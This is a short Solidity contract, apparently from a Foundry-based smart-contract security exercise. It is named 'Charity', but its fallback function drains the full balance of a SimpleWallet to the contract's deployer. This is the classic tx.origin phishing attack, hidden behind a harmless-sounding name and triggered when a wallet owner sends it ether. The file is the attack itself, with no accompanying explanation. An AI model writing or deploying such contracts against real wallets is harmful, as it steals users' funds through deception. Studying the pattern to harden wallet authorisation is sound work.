// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {console} from "forge-std/console.sol";

interface SimpleWallet {
    function transfer(address payable _to, uint _amount) external;
}

contract Charity {

    SimpleWallet simpleWallet;
    address payable private owner;
    constructor(address _simpleWallet) {
        owner = payable(msg.sender);
        simpleWallet = SimpleWallet(_simpleWallet);
    }

    fallback() external payable {
        simpleWallet.transfer(owner, address(simpleWallet).balance);
    }

}